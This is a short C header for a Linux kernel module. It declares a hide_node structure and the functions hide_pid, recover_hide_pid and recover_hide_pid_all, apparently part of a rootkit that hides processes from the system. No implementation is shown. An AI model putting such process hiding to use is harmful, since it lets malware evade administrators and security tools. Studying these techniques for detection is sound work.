#ifndef FILE_H_PROCESS
#define FILE_H_PROCESS
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/list.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/init_task.h>

struct hide_node{
  pid_t pid;
  struct task_struct *task_use;
  struct list_head node;
};

int hide_pid(pid_t a);
int recover_hide_pid(pid_t a);
int recover_hide_pid_all(void);

#endif
